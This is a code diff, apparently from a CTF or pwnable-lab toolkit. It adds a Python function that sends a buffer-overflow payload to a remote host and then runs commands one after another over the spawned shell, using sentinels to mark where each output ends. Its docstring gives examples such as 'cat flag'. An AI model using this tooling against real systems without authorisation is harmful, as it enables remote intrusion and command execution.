@@ -15,8 +15,10 @@
 
 from __future__ import annotations
 
+import secrets
 import socket
 import time
+from dataclasses import dataclass
 
 from pwnable_lab.sandbox.runner import ShellProof
 
@@ -82,3 +84,103 @@ def prove_shell_remote(
         command=cmd,
         output=output,
     )
+
+
+@dataclass
+class RemoteCommandResult:
+    """대화형 원격 셸에서 명령 하나의 실행 결과."""
+
+    command: str
+    output: bytes  # sentinel 앞까지의 명령 stdout(sentinel 제거됨).
+    marker: str  # 이 명령의 구분자(sentinel).
+    matched: bool  # sentinel 을 회수했는지(= 셸이 명령을 실행했는지).
+
+    def as_dict(self) -> dict:
+        return {
+            "command": self.command,
+            "output": self.output.decode("utf-8", "replace"),
+            "output_hex": self.output.hex(),
+            "marker": self.marker,
+            "matched": self.matched,
+        }
+
+
+@dataclass
+class InteractiveShellProof:
+    """대화형 원격 셸 세션 증명(한 연결에서 여러 명령 순차 실행)."""
+
+    shell_spawned: bool  # 첫 명령의 sentinel 회수 = 셸 획득.
+    commands: list[RemoteCommandResult]
+
+    def as_dict(self) -> dict:
+        return {
+            "shell_spawned": self.shell_spawned,
+            "commands": [c.as_dict() for c in self.commands],
+        }
+
+
+def prove_interactive_shell_remote(
+    host: str,
+    port: int,
+    payload: bytes,
+    *,
+    commands: list[str],
+    timeout: float = 5.0,
+    settle_seconds: float = 0.3,
+    max_recv_bytes: int = 65536,
+) -> InteractiveShellProof:
+    """원격 셸에서 **여러 명령을 한 연결로 순차 실행**해 대화형 세션을 증명한다.
+
+    :func:`prove_shell_remote` 는 명령 하나를 보내고 쓰기 방향을 닫아(EOF) 셸이
+    종료하며 flush 하게 하는 **단발** 증명이다. 이 함수는 연결을 닫지 않고 각 명령
+    뒤에 고유 sentinel(``echo <marker>``)을 붙여 스트림에서 명령 경계를 구분한다 —
+    CTF 플레이어가 셸 획득 후 ``id`` / ``pwd`` / ``cat flag`` 를 이어 치는 흐름과
+    동형이다. 각 명령 출력은 sentinel 직전까지를 담는다.
+
+    소켓은 tty 가 아니라 입력이 에코되지 않으므로 명령 텍스트가 출력에 섞이지 않는다.
+    셸이 어떤 명령에 응답을 멈추면(sentinel 미회수) 그 지점에서 중단한다. 첫 명령의
+    sentinel 을 회수하면 ``shell_spawned=True``.
+
+    트러스트 모델은 :func:`prove_shell_remote` 와 동일하다 — 바이너리 미실행,
+    사용자 지정 원격에 바이트만 전송, HTTP API 미노출(클라이언트측 유틸).
+    """
+
+    results: list[RemoteCommandResult] = []
+    with socket.create_connection((host, port), timeout=timeout) as sock:
+        sock.settimeout(timeout)
+        try:
+            # 1) 오버플로 payload → 셸 spawn.
+            sock.sendall(payload + b"\n")
+            if settle_seconds > 0:
+                time.sleep(settle_seconds)
+            # 2) 각 명령 뒤에 sentinel 을 붙여 보내고, sentinel 까지 출력을 회수한다.
+            for command in commands:
+                marker = "PWNPILOT_" + secrets.token_hex(4)
+                marker_bytes = marker.encode()
+                sock.sendall(f"{command}; echo {marker}\n".encode())
+                buf = bytearray()
+                matched = False
+                deadline = time.monotonic() + timeout
+                while len(buf) < max_recv_bytes and time.monotonic() < deadline:
+                    try:
+                        data = sock.recv(4096)
+                    except (TimeoutError, OSError):
+                        break
+                    if not data:
+                        break
+                    buf += data
+                    if marker_bytes in bytes(buf):
+                        matched = True
+                        break
+                # sentinel(및 이후)을 제거해 순수 명령 출력만 남긴다.
+                raw = bytes(buf)
+                idx = raw.find(marker_bytes)
+                clean = raw[:idx] if idx != -1 else raw
+                results.append(RemoteCommandResult(command, clean, marker, matched))
+                if not matched:
+                    break  # 셸이 응답을 멈춤 → 이후 명령 무의미.
+        except (TimeoutError, OSError):
+            pass
+
+    shell_spawned = bool(results) and results[0].matched
+    return InteractiveShellProof(shell_spawned=shell_spawned, commands=results)
